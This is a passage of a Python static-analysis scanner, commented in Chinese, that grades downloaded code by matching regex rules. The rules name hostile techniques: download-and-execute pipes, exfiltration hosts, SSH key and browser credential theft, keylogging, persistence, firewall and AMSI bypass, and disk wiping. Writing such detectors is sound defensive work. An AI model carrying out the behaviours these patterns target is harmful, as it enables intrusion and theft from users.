#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""检查下载来的代码有没有明显危险行为，按规则打分，给出 A/B/C/D 等级。

只读，不执行目标代码。只用标准库，没有第三方依赖。
"""

from __future__ import annotations

import argparse
import bisect
import hashlib
import json
import os
import re
import shutil
import sys
from datetime import datetime
from pathlib import Path

# ---------- 基本配置 ----------

APP_NAME = "repo-audit"
APP_VER = "1.0.0"

HERE = Path(__file__).resolve().parent
DEFAULT_TARGET = HERE.parent / "review-lab"
DEFAULT_OUT = HERE / "reports"

# 大文件只读开头，不然会卡死
MAX_TEXT_BYTES = 4 * 1024 * 1024
# 一次最多处理这么多文件
MAX_FILES = 8000
# 这些目录不扫，太杂
SKIP_DIRS = {".selftest", "_verify", "_test", ".pytest_tmp", ".git", ".svn", ".hg", "node_modules", "__pycache__", ".venv", "venv",
             ".mypy_cache", ".pytest_cache", ".idea", ".vscode", "dist", "build"}

SEV_W = {"critical": 40, "high": 18, "medium": 8, "low": 3, "info": 0}
CAT_CAP = 45          # 单个类别封顶，防止一类把分刷没
SEV_ORDER = ["critical", "high", "medium", "low", "info"]

CATS = {
    "pipe":    "下载即执行",
    "network": "网络外联",
    "cred":    "凭据 / 隐私",
    "persist": "持久化",
    "destroy": "破坏性操作",
    "privesc": "提权",
    "dyn":     "动态执行",
    "obfusc":  "混淆 / 加密",
    "spawn":   "进程与命令",
    "hook":    "安装钩子",
    "sysmod":  "系统修改",
    "evasion": "反分析 / 隐蔽",
    "file":    "可疑文件",
    "meta":    "元信息",
}

SEV_LABEL = {"critical": "致命", "high": "高", "medium": "中", "low": "低", "info": "提示"}

# 可执行 / 高危扩展名
RISKY_EXTS = {".exe", ".scr", ".pif", ".com", ".dll", ".msi", ".hta", ".vbs", ".vbe",
              ".jse", ".wsf", ".wsh", ".lnk", ".reg", ".sys", ".drv", ".ocx", ".cpl",
              ".jar", ".apk", ".bat", ".cmd", ".ps1", ".sh", ".py", ".js", ".vba"}

# 脚本类扩展名，本身正常
SCRIPT_EXTS = {".sh", ".bash", ".zsh", ".ps1", ".psm1", ".bat", ".cmd", ".py", ".js",
               ".mjs", ".cjs", ".ts", ".vbs", ".hta", ".rb", ".pl", ".php"}

# 文档里出现危险命令只是描述，不计分
DOC_EXTS = {".md", ".markdown", ".rst", ".adoc", ".txt", ".text", ".log", ".rtf"}

DOUBLE_EXT_RX = re.compile(
    r"\.(?:pdf|docx?|xlsx?|pptx?|jpe?g|png|gif|bmp|txt|zip|rar|7z|mp4|mp3|iso|torrent|csv|md)"
    r"\.(?:exe|scr|bat|cmd|vbs|js|ps1|hta|lnk|com|pif|jar)$", re.I)


# ---------- 规则表 ----------

def R(rid, title, sev, cat, pattern, why, max_hits=5):
    return {
        "id": rid, "title": title, "sev": sev, "cat": cat,
        "rx": re.compile(pattern, re.I | re.M),
        "why": why, "max_hits": max_hits,
    }


RULES = [
    # ---------------- 下载即执行 ----------------
    R("pipe_shell", "下载完直接丢给 shell 执行", "critical", "pipe",
      r"(?:curl|wget|Invoke-WebRequest|\biwr\b|Invoke-RestMethod|\birm\b)\b[^\n|]{0,200}"
      r"\|\s*(?:sudo\s+)?(?:ba|z|k|da|fi)?sh\b"
      r"|(?:curl|wget|\biwr\b|\birm\b|Invoke-WebRequest|Invoke-RestMethod)\b[^\n|]{0,200}"
      r"\|\s*(?:iex|Invoke-Expression)\b", "远程内容没过校验就执行，最常见的投放方式。"),

    R("dl_to_disk", "把远程文件下载成本地脚本", "high", "pipe",
      r"(?:curl|wget)\s+[^\n]{0,150}(?:-o|--output|-O)\s+[^\s\"']+\.(?:sh|py|ps1|bat|exe|dll|scr|vbs|js)\b", "一般后面会跟着 chmod +x 直接跑。"),

    R("b64_exec", "base64 解码后执行", "critical", "pipe",
      r"(?:base64\s+(?:-d|--decode|--d)|b64decode\s*\(|FromBase64String\s*\(|atob\s*\()"
      r"[^\n]{0,120}?(?:exec\s*\(|eval\s*\(|\|\s*(?:ba)?sh\b|iex\b|Invoke-Expression)", "编码过就看不出来里面是什么。"),

    # ---------------- 网络外联 ----------------
    R("exfil_host", "连到常见的外传或回连域名", "high", "network",
      r"(?:pastebin\.com|paste\.ee|transfer\.sh|0x0\.st|termbin\.com|webhook\.site|"
      r"requestbin\.|pipedream\.net|api\.telegram\.org/bot|discord(?:app)?\.com/api/webhooks|"
      r"ngrok(?:-free)?\.(?:io|app|dev)|burpcollaborator|interact\.sh|hookbin|beeceptor|"
      r"canarytokens)", "这些域名基本只用来往外交数据。"),

    R("insecure_tls", "关掉了 TLS 证书校验", "medium", "network",
      r"(?:curl\s+[^\n]{0,60}(?:\s-k\b|--insecure)|verify\s*=\s*False|InsecureSkipVerify|"
      r"rejectUnauthorized\s*:\s*false|NODE_TLS_REJECT_UNAUTHORIZED)", "curl -k 或 verify=False，下载的内容能被替换。"),

    R("net_generic", "有网络请求", "low", "network",
      r"\b(?:requests\.(?:get|post|put)\(|urllib\.request|http\.client|socket\.socket|"
      r"http\.server|fetch\s*\(|XMLHttpRequest|axios\.|Invoke-WebRequest|\biwr\b|\bcurl\b|"
      r"\bwget\b|Net::HTTP|node-fetch)", "只能说明它会联网。"),

    # ---------------- 凭据 / 隐私 ----------------
    R("ssh_access", "读 SSH 私钥", "critical", "cred",
      r"(?:\.ssh[/\\]|\bid_rsa\b|\bid_ed25519\b|\bid_ecdsa\b|authorized_keys|known_hosts)", "正常工具不会去碰 .ssh。"),

    R("browser_data", "读浏览器 Cookie 或密码库", "critical", "cred",
      r"(?:Login Data|Web Data|Local State|key4\.db|logins\.json|signons\.sqlite|"
      r"(?:Chrome|Edge|Brave|Opera)[/\\]User Data|Mozilla[/\\]Firefox[/\\]Profiles)", "偷登录态的常规做法。"),

    R("wallet", "涉及钱包或助记词", "critical", "cred",
      r"(?:wallet\.dat|MetaMask|Exodus|Electrum|Keplr|Phantom|Trust ?Wallet|"
      r"seed\s*phrase|mnemonic)", "跟钱有关，误报也得先看一眼。"),

    R("hardcoded_secret", "代码里写死了密钥", "high", "cred",
      r"(?:ghp_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{40,}|AKIA[0-9A-Z]{16}|"
      r"xox[baprs]-[A-Za-z0-9-]{10,}|sk-[A-Za-z0-9]{20,}|AIza[0-9A-Za-z_\-]{30,}|"
      r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----)", "作者把自己的 token 提交上来了，先按已泄露处理。"),

    R("keylog", "键盘记录或全局钩子", "critical", "cred",
      r"(?:GetAsyncKeyState|SetWindowsHookEx|WH_KEYBOARD|keyboard\.Listener|"
      r"pynput[^\n]{0,40}keyboard|keylogger)", "直接监控你敲了什么。"),

    R("clipboard", "读写剪贴板", "high", "cred",
      r"(?:Get-Clipboard|Set-Clipboard|\bxclip\b|\bxsel\b|pyperclip|"
      r"win32clipboard|clipboard\.(?:read|write))", "剪贴板里有密码和钱包地址。"),

    R("screen_capture", "截屏", "medium", "cred",
      r"(?:ImageGrab\.grab|pyautogui\.screenshot|CopyFromScreen|BitBlt)", "可能在回传屏幕内容。"),

    R("env_access", "读环境变量", "low", "cred",
      r"(?:os\.environ\b|process\.env\.|os\.getenv\(|\bgetenv\()", "正常用法也多，配合外联才可疑。"),

    # ---------------- 持久化 ----------------
    R("persist_run", "写注册表 Run 键", "critical", "persist",
      r"(?:\\CurrentVersion\\Run(?:Once)?\b|reg(?:\.exe)?\s+add[^\n]{0,120}\\Run\b|"
      r"Set-ItemProperty[^\n]{0,120}\\Run\b)", "开机自启的经典写法。"),

    R("persist_task", "建计划任务或服务", "critical", "persist",
      r"(?:schtasks(?:\.exe)?\s+/create|Register-ScheduledTask|New-ScheduledTask|"
      r"crontab\s+-[elu]|/etc/cron|/etc/rc\.local|/etc/systemd/system|"
      r"LaunchAgents|LaunchDaemons|New-Service\b|sc(?:\.exe)?\s+create)", "跑一次的东西不该留常驻入口。"),

    R("persist_startup", "写启动目录", "critical", "persist",
      r"(?:shell:startup|Start Menu\\Programs\\Startup|\\Startup\\[^\\\n]{0,60}\.lnk)", "同上，属于自我安装。"),

    # ---------------- 破坏性操作 ----------------
    R("destroy_sys", "对磁盘分区动手", "critical", "destroy",
      r"(?:\brm\s+-[a-z]*r[a-z]*f\s+/(?:\s|$|\*)|format\s+[a-zA-Z]:|diskpart|bcdedit|"
      r"wipefs|mkfs\.|cipher\s+/w)", "误执行不可恢复。"),

    R("destroy_gen", "有删文件的调用", "medium", "destroy",
      r"(?:shutil\.rmtree\(|os\.remove\(|os\.unlink\(|\.unlink\(\)|\brm\s+-[a-z]*r[a-z]*f\b|"
      r"\brd\s+/s\b|\brmdir\s+/s\b|\bdel\s+/[fsq]\b|Remove-Item[^\n]{0,80}-Recurse)", "可能只是清临时文件，重点看它删的路径。"),

    R("dd_write", "往块设备写数据", "high", "destroy",
      r"dd\s+if=[^\n]*of=/dev/", "写错目标就毁盘。"),

    # ---------------- 提权 ----------------
    R("privesc", "要求提权或改执行策略", "high", "privesc",
      r"(?:\bsudo\s+\S|Start-Process[^\n]{0,80}-Verb\s+RunAs|runas\s+/user:|"
      r"Set-ExecutionPolicy\s+(?:Bypass|Unrestricted)|chmod\s+(?:-R\s+)?777)", "要管理员权限的脚本，标准得提高一档。"),

    R("uac_bypass", "UAC 绕过手法", "critical", "privesc",
      r"(?:fodhelper|eventvwr\.exe[^\n]{0,40}shell|sdclt|computerdefaults|slui\.exe|"
      r"bypassuac|uacme)", "恶意软件专用技巧。"),

    # ---------------- 动态执行 ----------------
    R("dyn_eval", "字符串当代码执行", "medium", "dyn",
      r"(?<![\w.])eval\s*\(|(?<![\w.])exec\s*\(|new\s+Function\s*\(|Invoke-Expression|(?<![\w.])iex\s", "eval / exec / iex，看不出来实际跑什么。"),

    R("dyn_import", "动态导入模块", "medium", "dyn",
      r"(?:__import__\(|importlib\.import_module|getattr\(\s*__builtins__)", "常用来藏真正加载的东西。"),

    R("unsafe_deser", "不安全的反序列化", "high", "dyn",
      r"(?:pickle\.loads?\s*\(|marshal\.loads\(|yaml\.load\s*\((?!\s*[^)]*Loader)|"
      r"dill\.loads|jsonpickle\.decode|shelve\.open)", "恶意数据能直接变成代码执行。"),

    # ---------------- 混淆 ----------------
    R("obf_enc", "PowerShell 编码命令", "critical", "obfusc",
      r"(?:-(?:enc|encodedcommand)\s+[A-Za-z0-9+/=]{40,}|FromBase64String\s*\([^)]{20,}\))", "绕过检测的常用手段。"),

    R("obf_charcode", "用字符码拼字符串", "high", "obfusc",
      r"(?:String\.fromCharCode|charCodeAt\()", "用来藏 URL 和路径。"),

    R("obf_hex", "大段十六进制转义", "high", "obfusc",
      r"(?:\\x[0-9a-fA-F]{2}){10,}", "同上，把字符串藏起来。"),

    R("obf_b64_block", "嵌了大段 base64", "medium", "obfusc",
      r"[A-Za-z0-9+/]{200,}={0,2}", "可能是图片资源，也可能是加密载荷。"),

    # ---------------- 进程与命令 ----------------
    R("spawn_shell", "通过 shell 执行命令", "high", "spawn",
      r"(?:subprocess\.\w+\([^)]{0,200}shell\s*=\s*True|os\.system\s*\(|os\.popen\s*\(|"
      r"child_process\.exec(?:Sync)?\s*\(|Start-Process\b|cmd(?:\.exe)?\s+/c\b)", "参数拼接不当就等于把 shell 交出去。"),

    R("spawn_pwsh", "调用 PowerShell 等解释器", "medium", "spawn",
      r"(?:powershell(?:\.exe)?\s+-|wscript|cscript|mshta|regsvr32|rundll32|bitsadmin|certutil)", "LOLBin，常用来绕白名单。"),

    R("hidden_window", "隐藏窗口运行", "high", "evasion",
      r"(?:WindowStyle\s+Hidden|CREATE_NO_WINDOW|0x08000000|\bSW_HIDE\b)", "不让你看见它在干什么。"),

    # ---------------- 安装钩子 ----------------
    R("npm_hook", "package.json 带 install 钩子", "high", "hook",
      r"[\"'](?:pre|post)install[\"']\s*:", "npm install 就会执行，不用你手动跑。"),

    R("py_hook", "安装时执行自定义代码", "high", "hook",
      r"(?:cmdclass\s*=|setup\(\s*[^)]{0,200}\bscripts\s*=|build_ext|py2exe|PyInstaller)", "pip install 阶段就跑，同样绕过手动确认。"),

    R("pip_url", "依赖来源不是 PyPI", "high", "hook",
      r"(?:pip\s+install[^\n]{0,80}https?://|--extra-index-url|-i\s+https?://|git\+https?://)", "除非你信任那个源。"),

    # ---------------- 系统修改 ----------------
    R("hosts_edit", "改 hosts", "high", "sysmod",
      r"(?:/etc/hosts|C:\\Windows\\System32\\drivers\\etc\\hosts|System32\\drivers\\etc)", "能劫持域名，把流量导走。"),

    R("path_edit", "改 PATH", "high", "sysmod",
      r"(?:setx\s+\w+\s|\[Environment\]::SetEnvironmentVariable|export\s+PATH=)", "后面所有命令都可能调到它的替身。"),

    R("fw_disable", "关防火墙或杀软", "critical", "sysmod",
      r"(?:netsh\s+(?:advfirewall|firewall)[^\n]{0,40}(?:off|disable)|"
      r"Set-MpPreference[^\n]{0,60}Disable|Add-MpPreference[^\n]{0,40}ExclusionPath|"
      r"ufw\s+disable|systemctl\s+(?:stop|disable)\s+(?:firewalld|ufw)|iptables\s+-F)", "没正当理由会这么干。"),

    R("amsi_bypass", "针对 AMSI 或 ETW 绕过", "critical", "evasion",
      r"(?:amsiInitFailed|AmsiScanBuffer|AMSI\s+bypass|EtwEventWrite|PatchETW)", "专门躲检测。"),

    R("vm_detect", "检测虚拟机或沙盒", "medium", "evasion",
      r"(?:VMware|VirtualBox|VBOX(?:USERS|GUEST|Service)|qemu|SbieDll|sandboxie|"
      r"hypervisor|WineGetVersion)", "发现自己在沙盒里就不干活的，一般不是好程序。"),

    R("sleep_long", "长时间静默", "low", "evasion",
      r"(?:time\.sleep\(\s*(?:[6-9]\d|1\d)\d{2,}|Start-Sleep\s+(?:-s(?:econds)?\s+)?(?:[6-9]\d|1\d)\d{2,})", "常见于躲沙盒的观察窗口。"),

    R("self_delete", "运行后删掉自己", "critical", "evasion",
      r"(?:Remove-Item[^\n]{0,40}\$MyInvocation|del\s+[^\n]{0,40}%~f0|"
      r"rm\s+-f\s+[^\n]{0,20}\$0\b|self[._]?delete|DeleteSelf)", "抹痕迹。"),
]


# ---------- 文件识别 ----------

def read_head(path: Path, n: int = 8192) -> bytes:
    try:
        with open(path, "rb") as f:
            return f.read(n)
    except OSError:
        return b""


def sniff_kind(head: bytes) -> str:
    if head.startswith(b"MZ"):
        return "PE"
    if head.startswith(b"\x7fELF"):
        return "ELF"
    if head.startswith(b"PK\x03\x04"):
        return "ZIP"
    if head.startswith(b"\x1f\x8b"):
        return "GZIP"
    if head.startswith(b"7z\xbc\xaf"):
        return "7Z"
    if head.startswith(b"Rar!"):
        return "RAR"
    if head.startswith(b"%PDF"):
        return "PDF"
    if head.startswith(b"\xd0\xcf\x11\xe0"):
        return "OLE"
    if head.startswith(b"\xca\xfe\xba\xbe"):
        return "MACHO/JAVA"
    if head.startswith(b"#!"):
        return "SHEBANG"
    if b"\x00" in head[:2048]:
        return "BINARY"
    return "TEXT"


EXT_EXPECT = {
    ".exe": {"PE"}, ".dll": {"PE"}, ".scr": {"PE"}, ".sys": {"PE"}, ".ocx": {"PE"},
    ".msi": {"OLE"}, ".doc": {"OLE"}, ".xls": {"OLE"},
    ".zip": {"ZIP"}, ".docx": {"ZIP"}, ".xlsx": {"ZIP"}, ".pptx": {"ZIP"},
    ".jar": {"ZIP"}, ".apk": {"ZIP"},
    ".pdf": {"PDF"},
    ".gz": {"GZIP"}, ".7z": {"7Z"}, ".rar": {"RAR"},
}


def sha256_of(path: Path, limit: int = 64 * 1024 * 1024) -> str:
    h = hashlib.sha256()
    total = 0
    try:
        with open(path, "rb") as f:
            while True:
                chunk = f.read(1024 * 256)
                if not chunk:
                    break
                h.update(chunk)
                total += len(chunk)
                if total >= limit:
                    return h.hexdigest() + "…"
    except OSError:
        return "(unreadable)"
    return h.hexdigest()


def decode_text(raw: bytes):
    for enc in ("utf-8-sig", "utf-8", "gb18030", "cp1252"):
        try:
            return raw.decode(enc), enc
        except UnicodeDecodeError:
            continue
    return raw.decode("latin-1", errors="replace"), "latin-1"


def collect_files(root: Path, max_files: int = MAX_FILES):
    """返回 (文件列表, 跳过的目录列表, 是否被截断)"""
    files, skipped, truncated = [], [], False
    for dirpath, dirnames, filenames in os.walk(root, topdown=True, followlinks=False):
        keep = []
        for d in dirnames:
            if d in SKIP_DIRS:
                skipped.append(str(Path(dirpath) / d))
            else:
                keep.append(d)
        dirnames[:] = keep
        for name in filenames:
            p = Path(dirpath) / name
            if len(files) >= max_files:
                truncated = True
                break
            files.append(p)
        if truncated:
            break
    return files, skipped, truncated


# ---------- 扫描 ----------

class Finding:
    __slots__ = ("rule", "sev", "cat", "title", "why", "path", "line", "snippet")

    def __init__(self, rule, path, line, snippet):
        self.rule = rule["id"]
        self.sev = rule["sev"]
        self.cat = rule["cat"]
        self.title = rule["title"]
        self.why = rule["why"]
        self.path = path
        self.line = line
        self.snippet = snippet

    def as_dict(self):
        return {
            "rule": self.rule, "severity": self.sev, "category": self.cat,
            "title": self.title, "why": self.why,
            "file": self.path, "line": self.line, "snippet": self.snippet,
        }


def _snippet(text: str, start: int, end: int, width: int = 150) -> str:
    lo = max(0, start - 40)
    hi = min(len(text), end + width)
    s = text[lo:hi].replace("\r", " ").replace("\n", " ").replace("\t", " ")
    s = re.sub(r"\s{2,}", " ", s).strip()
    return (s[:190] + "…") if len(s) > 190 else s


def _line_text(text: str, newlines: list, line: int, width: int = 190) -> str:
    """取第 line 行的原文，压平空白再截断。"""
    lo = newlines[line - 1] if line - 1 < len(newlines) else 0
    hi = newlines[line] if line < len(newlines) else len(text)
    s = text[lo:hi].replace("\r", " ").replace("\n", " ").replace("\t", " ")
    s = re.sub(r"\s{2,}", " ", s).strip()
    return (s[:width] + "…") if len(s) > width else s


def apply_rules(text: str, rel: str, ext: str, is_doc: bool, findings: list):
    """按规则表扫一遍，同一行同一规则只记一条。"""
    newlines = [0]
    newlines.extend(m.end() for m in re.finditer("\n", text))
    seen = set()

    for rule in RULES:
        if rule["id"] == "obf_b64_block" and ext not in SCRIPT_EXTS and ext not in (".json", ".txt", ".md"):
            continue
        # 文档里的危险命令只是描述，降成提示
        eff = rule
        if is_doc:
            eff = {"id": rule["id"], "sev": "info", "cat": rule["cat"],
                   "title": rule["title"] + "（文档描述，未执行）", "why": rule["why"]}
        hits = 0
        for m in rule["rx"].finditer(text):
            if hits >= rule["max_hits"]:
                break
            line = bisect.bisect_right(newlines, m.start())
            key = (rule["id"], line)
            if key in seen:
                continue
            seen.add(key)
            snippet = _line_text(text, newlines, line) or _snippet(text, m.start(), m.end())
            findings.append(Finding(eff, rel, line, snippet))
            hits += 1

    # 压缩或混淆过的代码
    if ext in SCRIPT_EXTS and text:
        longest = max((len(l) for l in text.splitlines()), default=0)
        if longest > 2000:
            findings.append(Finding(
                {"id": "long_line", "sev": "low", "cat": "obfusc",
                 "title": f"有超长单行",
                 "why": "压缩或混淆过，得先还原。"},
                rel, 0, f"最长行 {longest} 字符"))


ARCHIVE_EXTS = {".zip", ".tar", ".gz", ".tgz", ".rar", ".7z", ".xz", ".bz2"}
TEXT_LIKE = SCRIPT_EXTS | DOC_EXTS | {
    ".json", ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf", ".xml",
    ".cs", ".java", ".go", ".rs", ".c", ".h", ".cpp", ".hpp", ".kt", ".swift",
    ".jsx", ".tsx", ".vue", ".sql", ".env", ".properties", ".gradle", ".cmake",
}
ZIP_MAX_ENTRIES = 3000
ZIP_MAX_TEXT_FILES = 200
ZIP_ENTRY_BYTES = 256 * 1024


def scan_zip(path: Path, rel: str, findings: list):
    """在内存里读 zip 条目，不解压到磁盘。"""
    import zipfile
    try:
        zf = zipfile.ZipFile(path)
    except Exception as e:
        findings.append(Finding(
            {"id": "zip_broken", "sev": "info", "cat": "meta",
             "title": "压缩包打不开", "why": "可能损坏，或者不是标准 zip。"},
            rel, 0, f"{type(e).__name__}"))
        return

    with zf:
        infos = [i for i in zf.infolist() if not i.filename.endswith("/")]
        total_u = sum(i.file_size for i in infos)
        try:
            comp = path.stat().st_size
        except OSError:
            comp = 0
        ratio = (total_u / comp) if comp else 0
        findings.append(Finding(
            {"id": "zip_info", "sev": "info", "cat": "meta",
             "title": f"压缩包内容",
             "why": "在内存里读的，没解压到磁盘。"},
            rel, 0, f"解压后 {total_u/1048576:.2f} MB，压缩比 {ratio:.1f}"))

        if ratio > 120 and total_u > 30 * 1024 * 1024:
            findings.append(Finding(
                {"id": "zip_bomb", "sev": "medium", "cat": "file",
                 "title": "压缩比高得离谱",
                 "why": "解压会撑爆磁盘。"}, rel, 0, f"压缩比 {ratio:.0f}"))

        seen = {"risky": 0, "double": 0, "trav": 0, "nested": 0}
        text_done = 0
        for info in infos[:ZIP_MAX_ENTRIES]:
            name = info.filename
            base = name.replace("\\", "/").rsplit("/", 1)[-1]
            ext = os.path.splitext(base)[1].lower()

            if ".." in name.replace("\\", "/").split("/") or name.startswith("/") or re.match(r"^[A-Za-z]:", name):
                if seen["trav"] < 3:
                    findings.append(Finding(
                        {"id": "zip_traversal", "sev": "high", "cat": "file",
                         "title": "包内条目想跳到目录外",
                         "why": "解压时能写到系统任意位置。"},
                        rel, 0, name))
                seen["trav"] += 1

            if DOUBLE_EXT_RX.search(base) and seen["double"] < 3:
                findings.append(Finding(
                    {"id": "double_ext", "sev": "high", "cat": "file",
                     "title": "双扩展名伪装", "why": "利用系统隐藏扩展名骗点击。"},
                    rel, 0, name))
                seen["double"] += 1

            if ext in RISKY_EXTS - SCRIPT_EXTS and seen["risky"] < 5:
                findings.append(Finding(
                    {"id": "risky_binary", "sev": "high", "cat": "file",
                     "title": f"含可执行文件（{ext}）",
                     "why": "二进制没法逐行看，只能扔沙盒跑。"},
                    rel, 0, name))
                seen["risky"] += 1

            if ext in ARCHIVE_EXTS and seen["nested"] < 3:
                findings.append(Finding(
                    {"id": "zip_nested", "sev": "medium", "cat": "file",
                     "title": "包内还套着压缩包", "why": "多层嵌套是常见的规避手段。"},
                    rel, 0, name))
                seen["nested"] += 1

            if text_done >= ZIP_MAX_TEXT_FILES:
                continue
            if ext not in TEXT_LIKE and info.file_size > ZIP_ENTRY_BYTES:
                continue
            try:
                raw = zf.read(info)[:ZIP_ENTRY_BYTES]
            except Exception:
                continue
            if b"\x00" in raw[:2048]:
                continue
            text, _ = decode_text(raw)
            apply_rules(text, f"{rel}:{name}", ext, ext in DOC_EXTS, findings)
            text_done += 1


def scan_file(path: Path, rel: str, findings: list):
    ext = path.suffix.lower()
    is_doc = ext in DOC_EXTS
    head = read_head(path)
    kind = sniff_kind(head)

    # GitHub 下载多半是 zip：直接在内存里逐条检查，不解压
    if ext == ".zip":
        scan_zip(path, rel, findings)
        return

    # 文件类型层面的判断
    if ext in RISKY_EXTS - SCRIPT_EXTS:
        findings.append(Finding(
            {"id": "risky_binary", "sev": "high" if kind in ("PE", "ELF") else "medium",
             "cat": "file", "title": f"含可执行文件（{ext}）",
             "why": "二进制没法逐行看，只能扔沙盒跑。"},
            rel, 0, f"类型识别: {kind}"))

    if DOUBLE_EXT_RX.search(path.name):
        findings.append(Finding(
            {"id": "double_ext", "sev": "high", "cat": "file",
             "title": "双扩展名伪装", "why": "利用系统隐藏扩展名骗点击。"},
            rel, 0, path.name))

    expect = EXT_EXPECT.get(ext)
    if expect and kind not in expect and kind != "BINARY":
        findings.append(Finding(
            {"id": "type_mismatch", "sev": "high", "cat": "file",
             "title": f"扩展名和真实类型不符",
             "why": "看着像文档，其实是程序。"},
            rel, 0, f"{ext} -> {kind}"))

    if path.is_symlink():
        try:
            tgt = os.readlink(path)
        except OSError:
            tgt = "?"
        findings.append(Finding(
            {"id": "symlink", "sev": "medium", "cat": "file",
             "title": "有符号链接", "why": "链接可以指向扫描范围之外。"},
            rel, 0, tgt))
        return

    if kind != "TEXT" and kind != "SHEBANG":
        return  # 二进制不跑文本规则

    try:
        size = path.stat().st_size
    except OSError:
        size = 0
    try:
        with open(path, "rb") as f:
            raw = f.read(MAX_TEXT_BYTES)
    except OSError:
        return

    text, _enc = decode_text(raw)
    apply_rules(text, rel, ext, is_doc, findings)

    if size > MAX_TEXT_BYTES:
        findings.append(Finding(
            {"id": "truncated", "sev": "info", "cat": "meta",
             "title": "文件太大，只读了前 4MB",
             "why": "后半部分没检查。"},
            rel, 0, f"{size/1048576:.1f} MB"))


# ---------- 评分 ----------

def grade_of(deduction: int, has_critical: bool):
    if has_critical:
        return "D", "极高"
    if deduction <= 4:
        return "A", "低"
    if deduction <= 19:
        return "B", "中"
    if deduction <= 39:
        return "C", "高"
    return "D", "极高"


ADVICE = {
    "A": "没有触发任何值得担心的规则。可以在宿主机直接打开，仍建议先看一眼入口文件。",
    "B": "有个别需要留意的行为。先在 review-lab 沙盒里跑一遍，确认它在做什么再上本机。",
    "C": "风险较高。只在沙盒里跑；跑之前先看扣分明细里那几条是不是核心逻辑。",
    "D": "不要在这台机器上运行。如需研究，只放在断网沙盒（review-lab.wsb）里，且跑完销毁。",
}


def compute_deduction(findings):
    per_cat, seen = {}, set()
    for f in findings:
        if f.rule in seen:
            continue
        seen.add(f.rule)
        per_cat[f.cat] = per_cat.get(f.cat, 0) + SEV_W.get(f.sev, 0)
    total = sum(min(v, CAT_CAP) for v in per_cat.values())
    return min(total, 100), per_cat


# ---------- 报告 ----------

ANSI = {
    "critical": "\033[97;41m", "high": "\033[97;45m", "medium": "\033[30;43m",
    "low": "\033[30;46m", "info": "\033[90m",
}
RESET, BOLD, DIM = "\033[0m", "\033[1m", "\033[2m"


def enable_ansi():
    if os.name != "nt":
        return True
    try:
        import ctypes
        k = ctypes.windll.kernel32
        k.SetConsoleMode(k.GetStdHandle(-11), 7)
        return True
    except Exception:
        return False


USE_COLOR = False


def c(text, key=None):
    if not USE_COLOR:
        return text
    return f"{ANSI.get(key, '')}{text}{RESET}" if key else text


def render_console(results, total_score_grade, target_label):
    out = []
    out.append("")
    out.append(f"{BOLD if USE_COLOR else ''}{APP_NAME} · 静态审查报告{RESET if USE_COLOR else ''}")
    out.append(f"目标: {target_label}")
    out.append("-" * 68)

    for r in results:
        g, risk = r["grade"], r["risk"]
        bar = {"A": "\033[32m", "B": "\033[36m", "C": "\033[33m", "D": "\033[31m"}.get(g, "") if USE_COLOR else ""
        out.append(f"\n目录 {r['root']}")
        out.append(f"  文件 {r['file_count']} 个 · {r['total_mb']:.2f} MB · 得分 {r['score']}/100")
        out.append(f"  等级 {bar}{g}{RESET if USE_COLOR else ''}  ·  风险 {risk}")
        out.append(f"  {r['advice']}")

        counts = r["sev_counts"]
        line = "  " + "  ".join(
            f"{c(SEV_LABEL[s], s)} {counts.get(s, 0)}" for s in SEV_ORDER if counts.get(s)
        )
        if line.strip():
            out.append(line)

        top = [f for f in r["findings"] if f["severity"] in ("critical", "high")][:8]
        if top:
            out.append("  主要发现:")
            for f in top:
                loc = f"  {f['file']}:{f['line']}" if f["line"] else f"  {f['file']}"
                out.append(f"    {c('●', f['severity'])} {f['title']}{loc}")

    out.append("")
    out.append("-" * 68)
    if len(results) == 1:
        out.append(f"结论: 等级 {results[0]['grade']} · 风险 {results[0]['risk']}")
    out.append("完整报告已写入 reports/ 目录。")
    out.append("")
    print("\n".join(out))


def render_markdown(results, generated):
    L = []
    L.append("# 代码审查报告")
    L.append("")
    L.append(f"- 生成时间：{generated}")
    L.append(f"- 工具：{APP_NAME} v{APP_VER}（静态扫描，未执行被检查代码）")
    L.append("")
    for r in results:
        L.append(f"## {r['root']}")
        L.append("")
        L.append(f"**等级 {r['grade']} · 风险 {r['risk']}**  ·  得分 {r['score']}/100  ·  "
                 f"文件 {r['file_count']} 个 / {r['total_mb']:.2f} MB")
        L.append("")
        L.append(f"> {r['advice']}")
        L.append("")
        if r.get("notes"):
            for n in r["notes"]:
                L.append(f"- 注：{n}")
            L.append("")
        if not r["findings"]:
            L.append("未命中任何规则。")
            L.append("")
            continue
        L.append("### 扣分明细")
        L.append("")
        L.append("| 严重度 | 大类 | 问题 | 位置 |")
        L.append("|---|---|---|---|")
        for f in sorted(r["findings"], key=lambda x: SEV_ORDER.index(x["severity"])):
            loc = f"`{f['file']}:{f['line']}`" if f["line"] else f"`{f['file']}`"
            L.append(f"| {SEV_LABEL[f['severity']]} | {CATS.get(f['category'], f['category'])} "
                     f"| {f['title']} | {loc} |")
        L.append("")
        L.append("### 命中的代码")
        L.append("")
        for f in r["findings"]:
            if f["line"]:
                L.append(f"- **{f['title']}** — `{f['file']}:{f['line']}`")
                L.append(f"  - `{f['snippet']}`")
                L.append(f"  - 说明：{f['why']}")
        L.append("")
        L.append("### 文件清单")
        L.append("")
        for fi in r["files"][:80]:
            L.append(f"- `{fi['path']}` — {fi['size']} B — {fi['kind']} — {fi['sha256'][:16]}")
        if len(r["files"]) > 80:
            L.append(f"- …其余 {len(r['files']) - 80} 个文件见 JSON")
        L.append("")

    L.append("---")
    L.append("")
    L.append("## 评级标准")
    L.append("")
    L.append("| 等级 | 风险 | 说明 |")
    L.append("|---|---|---|")
    L.append("| A | 低 | 未触发规则，可直接查看 |")
    L.append("| B | 中 | 有少量可疑行为，先在沙盒里跑 |")
    L.append("| C | 高 | 有明确危险行为，只在沙盒内跑 |")
    L.append("| D | 极高 | 含致命项，不要在本机运行 |")
    L.append("")
    L.append("命中任何致命级规则，等级直接定为 D。")
    L.append("")
    L.append("## 局限")
    L.append("")
    L.append("- 纯静态检查：把恶意代码藏进二进制、加密载荷、或运行时才拼装，都可能漏。")
    L.append("- 只能判断有明显可疑行为，不能证明安全。")
    L.append("- 未覆盖：依赖链投毒（第三方包内部）、网络侧行为、运行时动态行为。")
    L.append("")
    return "\n".join(L)


# ---------- 主流程 ----------

